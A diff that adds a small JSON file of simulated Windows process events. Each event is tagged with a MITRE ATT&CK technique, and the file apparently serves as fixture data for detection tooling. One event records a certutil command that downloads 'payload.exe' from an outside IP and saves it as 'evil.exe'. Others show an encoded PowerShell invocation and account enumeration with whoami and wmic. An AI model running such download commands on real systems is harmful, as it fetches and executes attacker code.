@@ -1,0 +1,32 @@
+[
+  {
+    "event_id": "1",
+    "technique": "T1033",
+    "user": "WINDOWS\\khaled",
+    "image": "C:\\Windows\\System32\\whoami.exe",
+    "command_line": "cmd.exe /c whoami & wmic useraccount get /ALL",
+    "parent_image": "C:\\Windows\\System32\\cmd.exe",
+    "src_ip": "",
+    "file_hash": ""
+  },
+  {
+    "event_id": "1",
+    "technique": "T1105",
+    "user": "WINDOWS\\khaled",
+    "image": "C:\\Windows\\System32\\certutil.exe",
+    "command_line": "certutil -urlcache -split -f http://185.220.101.5/payload.exe evil.exe",
+    "parent_image": "C:\\Windows\\System32\\cmd.exe",
+    "src_ip": "185.220.101.5",
+    "file_hash": "44d88612fea8a8f36de82e1278abb02f"
+  },
+  {
+    "event_id": "1",
+    "technique": "T1059.001",
+    "user": "WINDOWS\\khaled",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -e aQBwAGMAbwBuAGYAaQBnAA==",
+    "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "src_ip": "",
+    "file_hash": ""
+  }
+]
